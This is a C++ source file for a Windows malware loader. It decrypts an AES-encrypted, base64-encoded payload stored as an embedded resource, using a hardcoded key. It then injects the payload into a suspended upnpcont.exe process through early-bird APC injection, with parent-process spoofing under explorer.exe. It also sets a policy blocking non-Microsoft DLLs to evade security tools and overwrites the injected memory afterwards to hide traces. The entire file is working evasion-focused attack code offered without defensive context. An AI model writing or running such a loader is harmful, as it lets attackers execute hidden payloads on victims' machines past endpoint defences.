#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <fstream>
#include <string>
#include "aes.hpp"
#include "base64.h"
#include "low.h"
#include "resource.h"


std::string LoadFileInResource(int name, int type, DWORD& size, const char*& data)
{
    HMODULE handle = ::GetModuleHandle(NULL);
    HRSRC rc = ::FindResource(handle, MAKEINTRESOURCE(name),
        MAKEINTRESOURCE(type));
    HGLOBAL rcData = ::LoadResource(handle, rc);
    size = ::SizeofResource(handle, rc);
    data = static_cast<const char*>(::LockResource(rcData));
    return data;
}
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

VOID hollow(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    
    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hollow_bin = TEXT("C:\\Windows\\System32\\upnpcont.exe");
    if (!CreateProcess(
        hollow_bin,			
        NULL,				
        NULL,				
        NULL,				
        FALSE,				
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	
        NULL,				
        TEXT("C:\\Windows\\System32"),
        (LPSTARTUPINFOW)&si,
        &pi					
    )) {
        DWORD errval = GetLastError();
        std::cout << "[!] ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 2500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    Sleep(1500);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{    
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    std::string decoded;
    base64 b64 = base64();

   
    DWORD size = 0;
    const char* data = NULL;
    std::string hyjgfks = LoadFileInResource(IDR_MYTEXTFILE, TEXTFILE, size, data);
    decoded = b64.base64_decode(hyjgfks);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    
    struct AES_ctx e_ctx;
    uint8_t iv[] = { 0xb4,0x30,0xec,0x73,0x14,0x99,0x81,0xba,0xa0,0x63,0xf2,0x89,0xd9,0xed,0x03,0x5e };
    uint8_t key[] = { 0xf2,0x10,0xea,0x3d,0x97,0x36,0xdb,0x94,0xdc,0x52,0x1c,0xe7,0xba,0xb8,0x34,0x2a,0x36,0x9f,0x5f,0xe9,0x28,0x05,0x3f,0xd1,0x1e,0xbd,0x7f,0xde,0x2e,0xe0,0xd7,0xfd };
    AES_init_ctx_iv(&e_ctx, key, iv);

    //here
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    
    for (int i = 0; i < ciphertext.size(); i++)
    {      
        recovered.push_back(ciphertext[i]);
    }

    hollow(recovered);
    return 0;
}

